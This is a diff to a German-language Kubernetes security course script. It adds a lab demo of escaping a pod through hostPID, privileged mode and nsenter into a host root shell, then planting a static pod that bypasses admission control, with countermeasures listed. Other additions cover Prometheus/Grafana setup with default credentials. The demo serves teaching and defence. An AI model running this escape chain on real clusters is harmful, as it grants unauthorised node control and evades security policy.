@@ -112,6 +112,9 @@
   1. Kubernetes - Pod Security Admission (PSA)
      * [Kap. 5.2.1 - PSA: Namespace-weite Durchsetzung von Pod Security Standards](#kap-521---psa-namespace-weite-durchsetzung-von-pod-security-standards)
 
+  1. Kubernetes - hostPID Exploit (Demo)
+     * [hostPID + privileged: Ausbruch aus dem Pod auf das Host-System](#hostpid-+-privileged-ausbruch-aus-dem-pod-auf-das-host-system)
+
   1. Kubernetes - SecurityContext
      * [Kap. 5.2.2/5.2.4/5.2.6/5.2.7/5.2.9 - Pods haerten: non-root, read-only, Capabilities, Seccomp](#kap-522524526527529---pods-haerten-non-root-read-only-capabilities-seccomp)
 
@@ -130,6 +133,11 @@
 
   1. Abschluss-Lab
      * [Kap. 5.1/5.2/5.3 - Pod Hardening Lab: SecurityContext, NetworkPolicy, RBAC](#kap-515253---pod-hardening-lab-securitycontext-networkpolicy-rbac)
+
+  1. Kubernetes Monitoring - Prometheus/Grafana
+     * [Prometheus Monitoring Server (Überblick)](#prometheus-monitoring-server-überblick)
+     * [Prometheus / Grafana Stack mit Helm installieren](#prometheus--grafana-stack-mit-helm-installieren)
+     * [Kubernetes Grafana Dashboards](#kubernetes-grafana-dashboards)
 
 
 ## Backlog - Kubernetes 
@@ -4201,16 +4209,18 @@ kubectl delete jobs kube-bench
 ### Walkthrough
 
 ```
-## Look for taints on master node
-kubectl describe node k8s-cp
-## easier
-kubectl describe node k8s-cp | grep -i taints 
+## Node-Namen anzeigen
+kubectl get nodes
+
+## Taint des Control-Plane-Nodes pruefen
+## Hinweis: Node-Name hat das Format k8s-tln<nr>-cp (z.B. k8s-tln1-cp)
+kubectl describe node k8s-tln1-cp | grep -i taints
 ```
 
 ```
-## Make control-plane scheduable for now
-kubectl taint nodes k8s-cp  node-role.kubernetes.io/control-plane:NoSchedule-
-kubectl describe node k8s-cp | grep -i taints 
+## Control-Plane schedulable machen
+kubectl taint nodes k8s-tln1-cp node-role.kubernetes.io/control-plane:NoSchedule-
+kubectl describe node k8s-tln1-cp | grep -i taints
 ```
 
 ```
@@ -4226,10 +4236,11 @@ wget https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
 
 ```
 ## nodeName in template/spec: ergänzen wie folgt
+## Hinweis: k8s-tln1-cp durch deinen Node-Namen ersetzen (siehe kubectl get nodes)
 spec:
   template:
     spec:
-      nodeName: k8s-cp
+      nodeName: k8s-tln1-cp
       containers:
         - command: ["kube-bench"]
  
@@ -4272,16 +4283,8 @@ on the control plane node and set the below parameter.
 #### Fix: Walkthrough 
 
 ```
-## ip - adresse ausfindig machen 
-kubectl get nodes -o wide | grep k8s-cp
-```
-
-```
-ssh 11trainingdo@<ip-des-control-plane-nodes>
-```
-
-```
-sudo su -
+## Auf den Control-Plane-Node wechseln
+ssh cp
 ```
 
 ```
@@ -4302,7 +4305,6 @@ kubectl -n kube-system describe pods kube-apiserver
 
 ```
 exit
-exit
 ```
 
 
@@ -4322,7 +4324,7 @@ diff report.txt report-afterfix.txt
 ### Make it non-scheduable again 
 
 ```
-kubectl taint nodes k8s-cp  node-role.kubernetes.io/control-plane:NoSchedule
+kubectl taint nodes k8s-tln1-cp node-role.kubernetes.io/control-plane:NoSchedule
 ```
 
 
@@ -4631,7 +4633,7 @@ wget https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
 spec:
   template:
     spec:
-      nodeName: k8s-w1
+      nodeName: k8s-tln1-w1
       containers:
         - command: ["kube-bench"]
  
@@ -4673,16 +4675,8 @@ For example, chmod 600 /lib/systemd/system/kubelet.service
 #### Fix: Walkthrough 
 
 ```
-## ip - adresse ausfindig machen 
-kubectl get nodes -o wide | grep k8s-w1
-```
-
-```
-ssh 11trainingdo@<ip-des-w1-worker-nodes>
-```
-
-```
-sudo su -
+## Auf den Worker-Node wechseln
+ssh worker
 ```
 
 ```
@@ -4700,7 +4694,6 @@ systemctl restart kubelet
 systemctl status kubelet 
 ```
 ```
-exit
 exit
 ```
 
@@ -5876,6 +5869,197 @@ kubectl delete namespace psa-restricted psa-warn
   * https://open-policy-agent.github.io/gatekeeper/
   * CIS Kubernetes Benchmark V1.12.0, Sektion 5.2
 
+## Kubernetes - hostPID Exploit (Demo)
+
+### hostPID + privileged: Ausbruch aus dem Pod auf das Host-System
+
+
+### Hintergrund
+
+`hostPID: true` im Pod-Spec erlaubt dem Container, **alle Prozesse des Host-Systems**
+zu sehen — nicht nur die eigenen. Kombiniert mit `privileged: true` und dem Tool
+`nsenter` kann ein Angreifer damit vollstaendig aus dem Container auf den Node ausbrechen.
+
+| Direktive | Wirkung |
+|-----------|---------|
+| `hostPID: true` | Pod sieht den PID-Namespace des Hosts (alle Prozesse) |
+| `privileged: true` | Container laeuft ohne Capability-Beschraenkungen (root auf dem Node) |
+| `nsenter` | Wechselt in beliebige Linux-Namespaces eines anderen Prozesses |
+
+**Angriffskette:**
+1. Pod mit `hostPID` + `privileged` starten
+2. PID 1 des Hosts sehen → `nsenter -a -t 1 bash` → Shell auf dem Host
+3. Zugriff auf `/etc/kubernetes/manifests` → Static Pod anlegen → Admission Controller wird umgangen
+
+---
+
+### Schritt 1: Angreifer-Pod starten
+
+```
+cd
+mkdir -p manifests/hostpid
+cd manifests/hostpid
+```
+
+```
+## vi 01-masterpod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    run: hostmagic
+  name: hostmagic
+spec:
+  containers:
+    - command:
+      - nsenter
+      - --mount=/proc/1/ns/mnt
+      - --
+      - /bin/sleep
+      - 99d
+      image: alpine
+      name: me
+      securityContext:
+        privileged: true
+  dnsPolicy: ClusterFirst
+  hostPID: true
+  nodeName: k8s-tln1-w1
+```
+
+> `nodeName` anpassen: `k8s-tln1-w1` → eigene Teilnehmernummer einsetzen.
+> Den Node-Namen mit `kubectl get nodes` herausfinden.
+
+```
+kubectl apply -f 01-masterpod.yaml
+kubectl get pod hostmagic
+```
+
+---
+
+### Schritt 2: Zweiten Pod auf demselben Node starten (Opfer)
+
+```
+## vi 02-nginx.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    run: nginx-victim
+  name: nginx-victim
+spec:
+  containers:
+  - image: nginx
+    name: nginx-victim
+  nodeName: k8s-tln1-w1
+```
+
+```
+kubectl apply -f 02-nginx.yaml
+kubectl wait pod nginx-victim --for=condition=Ready --timeout=60s
+```
+
+---
+
+### Schritt 3: Host-Prozesse aus dem Pod sehen
+
+```
+## Alle nginx-Prozesse des Hosts sehen
+kubectl exec -it hostmagic -- pgrep -a nginx
+```
+
+**Erwartete Ausgabe:** nginx-PIDs — obwohl nginx in einem anderen Pod laeuft.
+
+---
+
+### Schritt 4: In den Netzwerk-Namespace des Opfer-Pods einsteigen
+
+```
+## PID aus Schritt 3 einsetzen (z.B. 153770)
+kubectl exec -it hostmagic -- nsenter -n -t <PID> ss -ln
+```
+
+Wir sehen die offenen Ports des nginx-Containers — aus unserem Pod heraus.
+
+---
+
+### Schritt 5: Vollstaendiger Ausbruch auf den Host
+
+```
+## Shell direkt auf dem Host-System (PID 1 = init/systemd)
+kubectl exec -it hostmagic -- nsenter -a -t 1 bash
+```
+
+Jetzt laeuft die Shell **auf dem Node**, nicht mehr im Container.
+
+```
+## Beweis: Hostname des Nodes
+hostname
+
+## Host-Prozesse
+ps aux | head -10
+
+## Container-Runtime auf dem Node
+crictl ps
+```
+
+---
+
+### Schritt 6: Static Pod anlegen (Admission Controller umgehen)
+
+```
+## Wir sind noch in der Host-Shell aus Schritt 5
+cd /etc/kubernetes/manifests
+
+cat > nginxme.yaml <<EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nginxme
+spec:
+  containers:
+    - image: nginx
+      name: me
+EOF
+```
+
+```
+## kubelet erkennt die Datei automatisch und startet den Pod
+crictl ps | grep nginxme
+```
+
+**Beobachtung:** Der Pod laeuft direkt auf dem Node — ohne dass der Admission Controller
+ihn gesehen hat. NetworkPolicies, PSA und RBAC greifen hier nicht.
+
+```
+## Aufraumen: Datei loeschen, kubelet beendet den Pod automatisch
+rm /etc/kubernetes/manifests/nginxme.yaml
+exit
+```
+
+---
+
+### Schritt 7: Aufraemen
+
+```
+kubectl delete pod hostmagic nginx-victim
+```
+
+---
+
+### Gegenmaßnahmen
+
+| Maßnahme | Beschreibung |
+|----------|-------------|
+| `hostPID: false` (Default) | Nie explizit auf `true` setzen |
+| Pod Security Admission (`restricted`) | Blockiert `privileged` und `hostPID` |
+| `privileged: false` / `allowPrivilegeEscalation: false` | SecurityContext haerten |
+| Admission Controller (OPA/Kyverno) | Policy: `hostPID` verboten |
+| Node-Zugriff einschraenken | `/etc/kubernetes/manifests` nur fuer root zugaenglich |
+
+### Referenz
+
+  * https://github.com/kubernetes/kubeadm/issues/1541
+
 ## Kubernetes - SecurityContext
 
 ### Kap. 5.2.2/5.2.4/5.2.6/5.2.7/5.2.9 - Pods haerten: non-root, read-only, Capabilities, Seccomp
@@ -6416,11 +6600,18 @@ kubectl apply -f 02-allow-dns.yml -n default
 DNS testen:
 
 ```
-##dns klappt, aber http-traffic ist noch gesperrt 
-kubectl exec -n default frontend -- curl -v -s --max-time 5 http://backend
+kubectl exec -n default frontend -- getent hosts backend
 ```
 
-**Erwartete Ausgabe:** IP-Adresse wird aufgeloest.
+**Erwartete Ausgabe:** IP-Adresse wird aufgeloest (z.B. `10.96.x.x  backend.default.svc.cluster.local`).
+
+HTTP zu Backend schlaegt aber noch fehl:
+
+```
+kubectl exec -n default frontend -- curl -s --max-time 5 http://backend
+```
+
+**Erwarteter Fehler:** Timeout — HTTP-Traffic noch gesperrt.
 
 ---
 
@@ -6829,11 +7020,33 @@ Weniger Findings — `nginx-unprivileged` hat ein schlankeres Basisimage.
 
 ### Schritt 5: Cluster-weiter Sicherheitsscan
 
-Jetzt nicht nur ein Image, sondern den ganzen Cluster:
+Jetzt nicht nur ein Image, sondern den ganzen Cluster.
+
+> **Hinweis:** `trivy k8s` startet intern einen node-collector Job auf jedem Node.
+> Der Control-Plane-Node hat standardmaessig einen NoSchedule-Taint — dieser muss
+> kurz entfernt werden, sonst gibt es einen Timeout-Fehler:
+
+```
+kubectl taint nodes k8s-tln1-cp node-role.kubernetes.io/control-plane:NoSchedule-
+```
 
 ```
 trivy k8s --report=summary --skip-db-update
 ```
+
+Taint danach wieder setzen:
+
+```
+kubectl taint nodes k8s-tln1-cp node-role.kubernetes.io/control-plane:NoSchedule
+```
+
+> **Falls der Fehler "node-collector job already exists" erscheint:**
+> Ein vorheriger Scan-Lauf hat einen Job hinterlassen. Loeschen und nochmal:
+> ```
+> kubectl delete namespace trivy-temp --force --grace-period=0
+> # kurz warten, dann nochmal:
+> trivy k8s --report=summary --skip-db-update
+> ```
 
 Die Ausgabe gliedert sich in drei Bereiche:
 
@@ -8017,6 +8230,180 @@ kubectl patch serviceaccount default -p '{"automountServiceAccountToken": true}'
   * https://kubernetes.io/docs/concepts/services-networking/network-policies/
   * https://kubernetes.io/docs/reference/access-authn-authz/rbac/
   * https://www.cisecurity.org/benchmark/kubernetes (Sektion 5.1, 5.2, 5.3)
+
+## Kubernetes Monitoring - Prometheus/Grafana
+
+### Prometheus Monitoring Server (Überblick)
+
+
+### What does it do ?
+
+  * It monitors your system by collecting data
+  * Data is pulled from your system by defined endpoints (http) from your cluster 
+  * To provide data on your system, a lot of exporters are available, that
+    * collect the data and provide it in Prometheus
+
+### Technical 
+
+  * Prometheus has a TDB (Time Series Database) and is good as storing time series with data
+  * Prometheus includes a local on-disk time series database, but also optionally integrates with remote storage systems.
+  * Prometheus's local time series database stores data in a custom, highly efficient format on local storage.
+  * Ref: https://prometheus.io/docs/prometheus/latest/storage/
+
+### What are time series ? 
+
+  * A time series is a sequence of data points that occur in successive order over some period of time. 
+  * Beispiel: 
+    * Du willst die täglichen Schlusspreise für eine Aktie für ein Jahr dokumentieren
+    * Damit willst Du weitere Analysen machen 
+    * Du würdest das Paar Datum/Preis dann in der Datumsreihenfolge sortieren und so ausgeben
+    * Dies wäre eine "time series" 
+
+### Kompenenten von Prometheus 
+
+![Prometheus Schaubild](https://www.devopsschool.com/blog/wp-content/uploads/2021/01/What-is-Prometheus-Architecutre-components1-740x414.png)
+
+Quelle: https://www.devopsschool.com/
+
+#### Prometheus Server 
+
+1. Retrieval (Sammeln) 
+   * Data Retrieval Worker 
+     * pull metrics data
+1. Storage 
+   * Time Series Database (TDB)
+     * stores metrics data
+1. HTTP Server 
+   * Accepts PromQL - Queries (e.g. from Grafana)
+     * accept queries 
+  
+### Grafana ? 
+
+  * Grafana wird meist verwendet um die grafische Auswertung zu machen.
+  * Mit Grafana kann ich einfach Dashboards verwenden 
+  * Ich kann sehr leicht festlegen (Durch Data Sources), so meine Daten herkommen
+
+### Prometheus / Grafana Stack mit Helm installieren
+
+
+  * using the kube-prometheus-stack (recommended !: includes important metrics)
+
+### Step 1: Prepare values-file  
+
+```
+cd
+mkdir -p manifests 
+cd manifests 
+mkdir -p monitoring 
+cd monitoring 
+```
+
+```
+vi values.yml 
+```
+
+```
+fullnameOverride: prometheus
+
+alertmanager:
+  fullnameOverride: alertmanager
+
+grafana:
+  fullnameOverride: grafana
+
+kube-state-metrics:
+  fullnameOverride: kube-state-metrics
+
+prometheus-node-exporter:
+  fullnameOverride: node-exporter
+```
+
+### Step 2: Install with helm 
+
+```
+helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
+helm install prometheus prometheus-community/kube-prometheus-stack -f values.yml --namespace monitoring --create-namespace --version 61.3.1
+```
+
+### Step 3: Connect to prometheus from the outside world 
+
+#### Step 3.1: Start proxy to connect (on Bastion-Server)
+
+```
+## this is shown in the helm information 
+helm -n monitoring get notes prometheus
+
+## Get pod that runs prometheus 
+kubectl -n monitoring get service 
+kubectl -n monitoring port-forward svc/prometheus-prometheus 9090 &
+```
+
+#### Step 3.2: Start a tunnel from your local system to the Bastion-Server 
+
+```
+## Replace tln1 with your own user
+ssh -L 9090:localhost:9090 tln1@161.35.210.204
+```
+
+#### Step 3.3: Open prometheus in your local browser 
+
+```
+## in browser
+http://localhost:9090 
+```
+
+### Step 4: Connect to Grafana from the outside world 
+
+#### Step 4.1: Start proxy to connect (on Bastion-Server)
+
+```
+## Do the port forwarding 
+## Adjust your pod name here
+kubectl -n monitoring get pods | grep grafana 
+kubectl -n monitoring port-forward svc/grafana 3000 &
+```
+
+#### Step 4.2: Start a tunnel from your local system to the Bastion-Server 
+
+```
+## Replace tln1 with your own user
+ssh -L 3000:localhost:3000 tln1@161.35.210.204
+```
+
+#### Step 4.3: Open Grafana in your local browser
+
+```
+## in browser
+http://localhost:3000
+
+## Default credentials
+User: admin
+Password: prom-operator
+```
+
+### References:
+
+  * https://github.com/prometheus-community/helm-charts/blob/main/charts/kube-prometheus-stack/README.md
+  * https://artifacthub.io/packages/helm/prometheus-community/prometheus
+
+### Kubernetes Grafana Dashboards
+
+
+  * Das einfachste ist, man verwendet vorgefertigte Dashboards und passt diese für sich an.
+
+### Diese Dashboards können jeweils einfach über die entsprechende ID geladen werden 
+
+```
+z.B. k8s-views-pods.json	15760
+```
+
+  * https://grafana.com/grafana/dashboards/
+  * https://grafana.com/grafana/dashboards/15760-kubernetes-views-pods/
+
+### Ref: 
+
+  * https://0xdc.me/blog/a-set-of-modern-grafana-dashboards-for-kubernetes/
+  * https://github.com/dotdc/grafana-dashboards-kubernetes?tab=readme-ov-file#install-via-grafanacom
 
 ### Installation Ubuntu - snap
 
